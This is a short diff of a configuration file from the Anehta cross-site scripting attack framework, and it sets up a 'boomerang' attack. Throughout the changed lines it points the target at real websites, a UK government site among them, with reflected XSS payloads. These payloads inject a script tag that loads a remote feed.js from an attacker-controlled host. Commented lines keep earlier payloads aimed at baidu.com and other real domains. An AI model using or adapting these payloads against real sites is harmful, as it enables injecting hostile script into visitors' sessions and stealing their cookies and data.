@@ -8,15 +8,13 @@
 
 
 ////////////////////////////////////////////////////////////
-var target_domain = "www.gobolinux.org";
-//var target="http://passport.baidu.com/?getmypass&username=\"];document.write('<script src=http://www.secwiki.com/anehta/feed.js></script>');//";
-//var target="http://www.b.com/4.html#'><script src=\'"+feedurl+"\' ></script><'"; 
-//var target="http://www.underwoodlandcompany.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
-//var target="http://www.waikikicondosearch.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
-var target="http://www.gobolinux.org/?page=<script src="+feedurl+"></script>";
+var target_domain = "www.dsdni.gov.uk";
+//var target="http://www.gobolinux.org/?page=<script src="+feedurl+"></script>";
+var target="http://www.dsdni.gov.uk/nbcau-index/nbcau_search-results.htm?ha=nbcau&qt=gov}%3C/style%3E<script src='http://www.a.com/anehta/feed.js'></script>";
+
 
 // 前页面
-var org_url = "http://a.com/anehta/demo.html";
+var org_url = "http://www.a.com/anehta/demo.html";
 var org_domain = "www.a.com";
 //var org_url = "http://www.b.com/anehta/test.html";
 //var org_domain = "www.b.com";
@@ -27,6 +25,7 @@ if ($d.domain == org_domain){
    if (anehta.dom.checkCookie("boomerang") == false){
    	  // 在cookie里做标记，只弹一次
 	    anehta.dom.addCookie("boomerang", "x");
+	    //anehta.dom.persistCookie("boomerang");
 	    //alert(anehta.dom.getCookie("boomerang"));
    	  setTimeout( function (){
 	      //alert(target);
